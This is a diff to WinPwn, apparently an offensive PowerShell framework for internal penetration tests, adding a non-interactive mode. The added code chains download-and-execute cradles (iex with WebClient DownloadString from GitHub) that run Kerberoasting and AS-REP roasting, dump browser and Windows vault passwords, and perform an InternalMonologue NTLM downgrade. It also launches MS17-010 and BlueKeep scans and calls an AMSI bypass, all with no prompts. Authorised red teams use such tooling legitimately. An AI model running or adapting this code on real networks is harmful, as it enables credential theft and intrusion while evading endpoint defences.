@@ -105,7 +105,9 @@ function sharpcradle{
         [string]
         $argument2,
         [string]
-        $argument3
+        $argument3,
+        [string]
+        $noninteractive
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -120,6 +122,53 @@ __        ___       ____
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
    --> Automate some internal Penetrationtest processes
 '@
+        if ($noninteractive)
+        {
+            Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
+            Invoke-Seatbelt -Command "all"
+            
+            Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+            Invoke-Rubeus -Command "asreproast /format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
+            Invoke-Rubeus -Command "kerberoast /format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+            Get-Content $currentPath\Exploitation\ASreproasting.txt
+            Get-Content $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+
+            Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+            Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+            Get-Content $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
+
+            Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+            if (isadmin)
+            {
+                Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+            }
+            else
+            {
+                Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+            }
+
+            if (isadmin)
+            {
+                Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .\Exploitation\'
+                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
+                Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\Internalmonologue.txt
+                Get-Content $currentPath\Exploitation\Internalmonologue.txt
+             }
+             else
+             {
+                Write-Host -Foregroundcolor Yellow "Run as admin."
+             }
+            
+            return
+        }
         
         do
         {
@@ -667,6 +716,11 @@ function localreconmodules
         License: BSD 3-Clause
     #>
     #Local Reconning
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
 
 
            
@@ -886,7 +940,7 @@ function localreconmodules
             function morerecon{
             if (isadmin)
             {
-                $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
+                if(!$noninteractive){$PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'}
                 if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                 {
                     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
@@ -940,31 +994,38 @@ function localreconmodules
             }
             
             function browserpwn{
-            $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
+            $chrome = "yes"
+            if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
-                Install-SqlLiteAssembly
-                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
-                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
-                Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
+                try
+                {
+                    Install-SqlLiteAssembly
+                    Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
+                    Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
+                    Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
+                }
+                catch{}
             }
-	    
-            $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
+	        $IE = "yes"
+            if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'}
             if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
             {
 	    	    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 	    	    $vault = New-Object Windows.Security.Credentials.PasswordVault 
 	    	    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
 	        }
-            $browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'
+            $browserinfos = "yes"
+            if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}
             if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
             {
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
                 Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
             }
             }
-                pathcheck
+            
+            pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     @'
 
@@ -978,6 +1039,17 @@ __        ___       ____
    --> Localreconmodules
 
 '@
+    if ($noninteractive)
+    {
+        generalrecon
+        powershellsensitive
+        browserpwn
+        dotnet
+        passhunt -local $true -noninteractive
+        sessionGopher
+        sensitivefiles   
+        return;
+    }
     
     do
     {
@@ -1098,13 +1170,18 @@ function passhunt
         License: BSD 3-Clause
     #>
     #Local/Domain Recon / Privesc
+    [CmdletBinding()]
+
     Param
     (
         [bool]
         $local,
 
         [bool]
-        $domain
+        $domain,
+        
+        [Switch]
+        $noninteractive
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -1152,7 +1229,8 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
             Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
-            $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
+            $sharepasshunt = "yes"
+            if (!$noninteractive){$sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'}
             if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
             {
                 get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
@@ -1186,7 +1264,8 @@ function domainreconmodules
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
-            #Domain / Network Reconing
+    #Domain / Network Recon
+
 
 
  function generaldomaininfo{
@@ -1279,7 +1358,8 @@ function domainreconmodules
                         }
 			}catch{Write-Host "Got an error"}
                     }
-		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
+             $othersystems = "no"
+		    if (!$noninteractive){$othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'}
             	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
                     {
 		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
@@ -1313,6 +1393,22 @@ __        ___       ____
    --> Domainreconmodules
 
 '@
+    if ($noninteractive)
+    {
+        reconAD 
+        sharphound 
+        Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
+        shareenumeration
+        powerSQL -noninteractive
+        MS17-10 -noninteractive
+        passhunt -domain $true
+        GPOAudit
+        bluekeep -noninteractive
+        printercheck -noninteractive
+        RBCD-Check -noninteractive
+        GPORemoteAccessPolicy -noninteractive
+        return;
+    }
     
     do
     {
@@ -1366,32 +1462,55 @@ __        ___       ____
 
 function GPORemoteAccessPolicy
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1')
     Invoke-SharpGPO-RemoteAccessPolicies >> $currentPath\DomainRecon\GPO-RemoteAccess.txt
-    Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
-    pause;
+    if (!$noninteractive)
+    {
+        Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
+        pause;
+    }
 }
 function RBCD-Check
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1')
     $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
     Invoke-Get-RBCD-Threaded -Command "-s -d $Domain" >> $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
-    Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
-    pause;
+    if (!$noninteractive)
+    {
+        Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
+        pause;
+    }
 }
 
 function printercheck
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpPrinter.ps1')
     Invoke-SharpPrinter >> $currentPath\DomainRecon\printercheck.txt
-    Get-Content $currentPath\DomainRecon\printercheck.txt
-    pause;
+    if($noninteractive){
+        Get-Content $currentPath\DomainRecon\printercheck.txt
+        pause;
+    }
 }
 function GPOAudit
 {
@@ -1427,11 +1546,18 @@ function bluekeep
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
+
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/bluekeepscan.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-    $serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'
+    $serversystems = "yes"
+    if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'}
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
     {
 	if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
@@ -1494,11 +1620,20 @@ function MS17-10
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement / Exploitation Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ms17-10.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')
-    $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
+    $serversystems = "yes"
+    if(!$noninteractive)
+    {
+        $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
+    }
     if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
     {
 	    if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
@@ -1561,6 +1696,11 @@ function powerSQL
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement Phase
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
@@ -1586,7 +1726,8 @@ function powerSQL
     }
     Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
     move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
-    $uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'
+    $uncpath = "no"
+    if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'}
     if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
     {
         $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
@@ -1685,6 +1826,11 @@ function itm4nprivesc
 
 function otherchecks
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     
@@ -1802,10 +1948,21 @@ function otherchecks
 
 function winPEAS
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
+
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
-    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' ''}'
+    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' ''}'}
+    if ($noninteractive)
+    {
+        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
+        Invoke-winPEAS -command ' ' >> $currentPath\LocalPrivEsc\winPEAS.txt
+    }
     REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
 }
 
@@ -1829,6 +1986,15 @@ __        ___       ____
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
    --> local Privilege Escalation checks
 '@
+        if($noninteractive)
+        {
+            itm4nprivesc
+            winPEAS
+            oldchecks
+            otherchecks
+            return
+        }
+
         
         do
         {
@@ -2379,6 +2545,19 @@ function WinPwn
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+         [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $Domainrecon,
+        [Switch]
+        $Localrecon,
+        [Switch]
+        $Privesc,
+        [Switch]
+        $PowerSharpPack   
+    )
 @'
 
              
@@ -2393,6 +2572,27 @@ __        ___       ____
 '@
     dependencychecks
     AmsiBypass
+    if ($noninteractive)
+    {
+        if ($Domainrecon)
+        {
+            domainreconmodules -noninteractive
+        }
+        if ($Localrecon)
+        {
+            localreconmodules -noninteractive
+        }
+        if ($Privesc)
+        {
+            privescmodules -noninteractive
+        }
+        if ($PowerSharpPack)
+        {
+            sharpcradle -allthosedotnet -noninteractive
+        }
+        
+        return;
+    }
 
     do
     {
